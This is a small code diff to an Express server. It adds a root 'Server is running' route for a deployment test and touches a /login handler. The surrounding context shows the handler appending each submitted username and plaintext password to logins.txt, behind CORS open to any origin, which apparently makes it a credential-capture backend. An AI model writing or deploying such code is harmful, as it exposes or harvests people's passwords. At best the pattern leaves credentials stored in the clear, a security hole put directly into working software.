@@ -9,6 +9,11 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// Root route (fix for Render test)
+app.get("/", (req, res) => {
+    res.send("Server is running");
+});
+
 // File path
 const LOG_FILE = path.join(__dirname, "logins.txt");
 
@@ -21,7 +26,6 @@ app.post("/login", (req, res) => {
     const logEntry =
         `${time} | username=${username} | password=${password}\n`;
 
-    // Save into file
     fs.appendFile(LOG_FILE, logEntry, (err) => {
         if (err) {
             console.error("Error saving login:", err);
